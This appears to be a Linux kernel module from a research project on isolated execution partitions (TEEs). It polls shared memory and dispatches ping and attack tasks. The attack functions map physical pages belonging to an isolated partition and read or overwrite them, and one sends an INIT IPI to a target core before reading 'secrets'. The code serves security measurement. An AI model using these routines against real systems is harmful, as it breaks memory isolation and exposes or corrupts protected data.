#include <asm/nmi.h>
#include <asm/delay.h>
#include <asm/msr.h>
#include <linux/sched.h>

#include <linux/gfp.h>
#include <linux/highmem.h>
#include "tee_mgmt.h"
#include "lapic.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pascal Scholz <pascal.scholz@cyberus-technology.de>");

static struct shared_mem *SHARED_MEM_PTR = NULL;
static struct timer_list POLL_TIMER;
static u8 waiting = 0;
static int apic_id = 0;
static u64 physical_entry_addr = 0;

void ping_app(void);
/* ---------------
*  IMPORTANT: Although these functions (the following 3 until the one-line
*  comment) could be merged by conditionally executing memory operations, this
*  is nor recommended. I did this and because the branch predictor were wrong, I
*  got wrong result for the performance counter values in TEECore. All I'm
*  saying is, that it is easy to trigger Spectre-like behavior that can mess up
*  your measurements if you 'refactor' the code of these functions.
*/
void attack_mem_writing(void);
void attack_mem_reading(void);
void attack_mem_nop(void);
// --------------
void ipi_attack(void);

static void tee_poll_timer_handler(struct timer_list *timer)
{
	if (NULL == SHARED_MEM_PTR) 
	{
		pr_err("%s: Shared memory pointer not initialized!\n", __FUNCTION__);
	}
	switch(SHARED_MEM_PTR->status) {
		case TEE_C_TEE_READY:
			pr_info("%s: TEE ready, send command!\n", __FUNCTION__);
			// For now we init the ping app
			SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
			SHARED_MEM_PTR->status = TEE_C_NONE;
			waiting = 0;
			break;
		case TEE_C_TEE_SEND:
			// delegate to respective app
			pr_info("%s: Received data from TEE!\n", __FUNCTION__);
			switch(SHARED_MEM_PTR->task_id) {
				case TEE_T_PING:
					ping_app();
					break;
				case TEE_T_ATTACK_IPI:
					ipi_attack();
					break;
				case TEE_T_ATTACK_READ_MEM:
					attack_mem_reading();
					break;
				case TEE_T_ATTACK_WRITE_MEM:
					attack_mem_writing();
					break;
				case TEE_T_ATTACK_NOP_MEM:
					attack_mem_nop();
					break;
				case TEE_T_UNKNOWN:
				default:
					pr_info("Unknow task ID: %u", SHARED_MEM_PTR->task_id);
					break;
			}
			waiting = 0;
			break;
		// We don't need to do anything if our message was not processed yet
		case TEE_C_HOSTSEND:
		case TEE_C_NONE:
			if (0 == waiting) {
				pr_info("%s: No message pending!\n", __FUNCTION__);
				waiting = 1;
			}
			break;
		default:
			pr_info("%s:Received message with unknown code!\n", __FUNCTION__);
			break;
	}
	mod_timer(&POLL_TIMER, jiffies + msecs_to_jiffies(750));
}

int init_mgmt_module(u8 *shared_mem_ptr, int target_id, u64 entry_phys) {
	pr_info("%s: Install POLL timer handler\n", __FUNCTION__);
	SHARED_MEM_PTR = (struct shared_mem*) shared_mem_ptr;
	timer_setup(&POLL_TIMER, tee_poll_timer_handler, 0);
	mod_timer(&POLL_TIMER, jiffies + msecs_to_jiffies(750));
	apic_id = target_id;
	physical_entry_addr = entry_phys;

	return 0; 
}

void cleanup_tee_poll_timer(void) {
	del_timer(&POLL_TIMER);
}

void write_to_com_mem(void* buffer, size_t len) {
	memcpy(SHARED_MEM_PTR, buffer, len);
}

void ipi_attack(void) {
	unsigned long flags;
	u32 secret = 0;
	u64 secret_phy_addr = 0;
	u32 *secret_ptr = 0;

	// Vector not yet initalized
	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
	// The memory was initialized, we read
	// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
	// 64 bit physical memory addresss 
	secret_phy_addr = *((u64*) &(SHARED_MEM_PTR->memory[2]));
	/*
	* We got the physical address and can calculate the page frame number 
	* from it. The pages were already allocated (and never freed) when we 
	* copied the Elf to memory.
	*/

	// Disable IRQ while sending IPI
	local_irq_save(flags);

	pr_info("Sending IPI to %d...\n", apic_id);
	pr_info("TSC=%lld", __builtin_ia32_rdtsc());
	lapic_send_init_ipi_waiting(apic_id);
	
	local_irq_restore(flags);

	secret_ptr = (u32*) (((u64) kmap(pfn_to_page(secret_phy_addr >> 12))) | (secret_phy_addr & 0xFFF));
	pr_info("Received phy. addr: 0x%016llx mapped to 0x%016llx\n", 
		secret_phy_addr, (u64) secret_ptr);
	pr_info("Attempt to read memory of isolated partition");
	secret = ioread32(secret_ptr);
	kunmap(pfn_to_page(secret_phy_addr >> 12));
	
	SHARED_MEM_PTR->task_id = TEE_T_ATTACK_IPI;
	pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
	SHARED_MEM_PTR->status = TEE_C_HOSTSEND;

	pr_info("Read the following secrets: 0x%08x", secret);
}

void ping_app(void) {
	const u8 number_of_pings = 10;
	// We simply use the first byte of the payload to count the pings
	if (number_of_pings > SHARED_MEM_PTR->memory[0]) {
		pr_info("Ping count = %u\n", SHARED_MEM_PTR->memory[0]++);
		pr_info("Pong");
		SHARED_MEM_PTR->task_id = TEE_T_PING;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
	} else {
		pr_info("Done! Reached ping count %u", SHARED_MEM_PTR->memory[0]);
		SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_NONE;
	}
}

void attack_mem_writing() {
	const u8 number_of_read_attempts = 10;
	u64 address = 0;
	u64 secret_mem_size = 4096;
	u64 hash = 0;
	u32 *secret_mem = NULL;
	u32 num_iterations = secret_mem_size / sizeof(*secret_mem);

	// Vector not yet initalized
	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
	// The memory was initialized, we read
	if (number_of_read_attempts > SHARED_MEM_PTR->memory[1]) {
		// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
		// 64 bit physical memory addresss 
		address = *((u32*) &(SHARED_MEM_PTR->memory[2]));
		/*
		* We got the physical address and can calculate the page frame number 
		* from it. The pages were already allocated (and never freed) when we 
		* copied the Elf to memory.
		*/ 
		secret_mem = kmap(pfn_to_page(address >> 12));
		pr_info("Received phy. addr: 0x%016llx mapped to 0x%016llx\n", 
			address, (u64) secret_mem);
			for (u64 offset = 0; offset < num_iterations; offset++) {
				const u32 value = ioread32(secret_mem + offset);
				iowrite32(value + 1, (secret_mem + offset));
				hash += value + 1;
			}
		pr_info("%s: Hash: 0x%016llx", __FUNCTION__, hash);
		kunmap(pfn_to_page(address >> 12));

		++SHARED_MEM_PTR->memory[1];
		SHARED_MEM_PTR->task_id = TEE_T_ATTACK_WRITE_MEM;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
	} else {
		pr_info("Done! Reached task count of %u", number_of_read_attempts);
		SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_NONE;
	}
}

void attack_mem_reading() {
	const u8 number_of_read_attempts = 10;
	u64 address = 0;
	u64 secret_mem_size = 4096;
	u64 hash = 0;
	u32 *secret_mem = NULL;
	u32 num_iterations = secret_mem_size / sizeof(*secret_mem);

	// Vector not yet initalized
	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
	// The memory was initialized, we read
	if (number_of_read_attempts > SHARED_MEM_PTR->memory[1]) {
		// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
		// 64 bit physical memory addresss 
		address = *((u32*) &(SHARED_MEM_PTR->memory[2]));
		/*
		* We got the physical address and can calculate the page frame number 
		* from it. The pages were already allocated (and never freed) when we 
		* copied the Elf to memory.
		*/ 
		secret_mem = kmap(pfn_to_page(address >> 12));
		pr_info("Received phy. addr: 0x%016llx mapped to 0x%016llx\n", 
			address, (u64) secret_mem);
			for (u64 offset = 0; offset < num_iterations; offset++) {
				const u32 value = ioread32(secret_mem + offset);
				hash += value;
			}
		pr_info("%s: Hash: 0x%016llx", __FUNCTION__, hash);
		kunmap(pfn_to_page(address >> 12));

		++SHARED_MEM_PTR->memory[1];
		SHARED_MEM_PTR->task_id = TEE_T_ATTACK_READ_MEM;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
	} else {
		pr_info("Done! Reached task count of %u", number_of_read_attempts);
		SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_NONE;
	}
}

void attack_mem_nop() {
	const u8 number_of_read_attempts = 10;
	u64 address = 0;
	u32 *secret_mem = NULL;

	// Vector not yet initalized
	if (0 == SHARED_MEM_PTR->memory[0]) { return; }
	// The memory was initialized, we read
	if (number_of_read_attempts > SHARED_MEM_PTR->memory[1]) {
		// The 8 bytes beginning at memory SHARED_MEM_PTR->memory[2] denote a 
		// 64 bit physical memory addresss 
		address = *((u32*) &(SHARED_MEM_PTR->memory[2]));
		/*
		* We do nothing except of mapping the memory.
		*/ 
		secret_mem = kmap(pfn_to_page(address >> 12));
		kunmap(pfn_to_page(address >> 12));

		++SHARED_MEM_PTR->memory[1];
		SHARED_MEM_PTR->task_id = TEE_T_ATTACK_NOP_MEM;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_HOSTSEND;
	} else {
		pr_info("Done! Reached task count of %u", number_of_read_attempts);
		SHARED_MEM_PTR->task_id = TEE_T_UNKNOWN;
		pr_info("%s: TSC: 0x%016llx", __FUNCTION__, rdtsc());
		SHARED_MEM_PTR->status = TEE_C_NONE;
	}
}